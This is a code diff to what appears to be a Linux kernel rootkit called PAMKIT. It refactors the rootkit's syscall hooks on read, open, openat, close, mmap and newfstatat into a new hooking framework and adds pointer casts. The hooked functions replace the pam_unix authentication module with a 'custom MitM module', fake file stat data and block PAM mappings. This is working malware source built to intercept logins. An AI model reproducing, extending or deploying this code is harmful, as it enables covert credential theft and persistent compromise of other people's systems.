@@ -4,7 +4,8 @@
  */
 
 #include "sys.h"
-#include "net.h"
+#include "net/net.h"
+#include "hooking/hooking.h"
 
 //Get file struct and pin its path --> ! caller has to unpin path !
 static struct file *
@@ -202,7 +203,7 @@ hooked_read(unsigned int fd, char __user *buf, size_t count)
 
         //Read from virtual file
         #ifdef PTREGS_STUBS
-        ret = virtual_file_read(pt_regs->si, pt_regs->dx);
+        ret = virtual_file_read((char *)pt_regs->si, pt_regs->dx);
         #else
         ret = virtual_file_read(buf, count);
         #endif
@@ -278,7 +279,7 @@ path_lookup_cleanup:
 skip_file_lookup:
 
     #ifdef PTREGS_STUBS
-    ret = _replace_rules_in_buffer(pt_regs->si, ret);
+    ret = _replace_rules_in_buffer((char *) pt_regs->si, ret);
     #else
     ret = _replace_rules_in_buffer(buf, ret);
     #endif
@@ -337,7 +338,7 @@ hooked_open(const char __user *filename, int flags, umode_t mode)
         pr_debug("PAMKIT: Replacing the pam_unix module with the custom MitM module\n");
 
         #ifdef PTREGS_STUBS
-        copy_to_error = copy_to_user(pt_regs->si, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
+        copy_to_error = copy_to_user((char *) pt_regs->si, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
         #else
         copy_to_error = copy_to_user(filename, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
         #endif
@@ -413,7 +414,7 @@ hooked_openat(int dfd, const char __user *filename, int flags, umode_t mode)
         pr_debug("PAMKIT: Replacing the pam_unix module with the custom MitM module\n");
 
         #ifdef PTREGS_STUBS
-        copy_to_error = copy_to_user(pt_regs->si, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
+        copy_to_error = copy_to_user((char *) pt_regs->si, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
         #else
         copy_to_error = copy_to_user(filename, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
         #endif
@@ -567,7 +568,7 @@ hooked_newfstatat(int dfd, const char __user *filename, struct stat __user *stat
     custom_stat->st_blocks = 8;
 
     #ifdef PTREGS_STUBS
-    copy_to_error = copy_to_user(pt_regs->dx, custom_stat, sizeof(struct stat));
+    copy_to_error = copy_to_user((struct stat *) pt_regs->dx, custom_stat, sizeof(struct stat));
     #else
     copy_to_error = copy_to_user(statbuf, custom_stat, sizeof(struct stat));
     #endif
@@ -696,40 +697,13 @@ hooked_mmap(unsigned long addr, unsigned long len, int prot, int flags, int fd, 
     return PAMKIT_PREVENT_PAM_MAPPING;
 }
 
-//--------------------------------------------------------------------------------------
 
-#define _HOOK_NUMBER 6
-
-static function_hook_t hooks[] = {
-    HOOK("__x64_sys_read",      (unsigned long *) hooked_read,      (unsigned long *) &orig_read),
-    HOOK("__x64_sys_open",      (unsigned long *) hooked_open,      (unsigned long *) &orig_open),
-    HOOK("__x64_sys_openat",    (unsigned long *) hooked_openat,    (unsigned long *) &orig_openat),
-    HOOK("__x64_sys_close",     (unsigned long *) hooked_close,     (unsigned long *) &orig_close),
-    HOOK("__x64_sys_mmap",      (unsigned long *) hooked_mmap,      (unsigned long *) &orig_mmap),
-    HOOK("__x64_sys_newfstatat",(unsigned long *) hooked_newfstatat,(unsigned long *) &orig_newfstatat)
+hook_data_t old_pamkit_syscall_hooks[] = {
+    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_read", (unsigned long *) &orig_read, (unsigned long *) hooked_read, __NR_read),
+    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_open",  (unsigned long *) &orig_open, (unsigned long *) hooked_open, __NR_open),
+    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_openat", (unsigned long *) &orig_openat,  (unsigned long *) hooked_openat, __NR_openat),
+    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_close", (unsigned long *) &orig_close, (unsigned long *) hooked_close, __NR_close),
+    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_mmap",  (unsigned long *) &orig_mmap,  (unsigned long *) hooked_mmap, __NR_mmap),
+    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_newfstatat", (unsigned long *) &orig_newfstatat, (unsigned long *) hooked_newfstatat, __NR_newfstatat),
+    SYSCALL_HOOK_DATA_EMPTY
 };
-
-
-int
-do_syscall_hooking(void)
-{
-    int ret = do_hooking(hooks, _HOOK_NUMBER);
-
-    if (ret) {
-        pr_info("Unable to hook system calls");
-        return ret;
-    }
-    return PAMKIT_SUCCESS;
-}
-
-int
-undo_syscall_hooking(void)
-{
-    int ret = undo_hooking(hooks, _HOOK_NUMBER);
-
-    if (ret) {
-        pr_info("Unable to undo hooking");
-        return ret;
-    }
-    return PAMKIT_SUCCESS;
-}
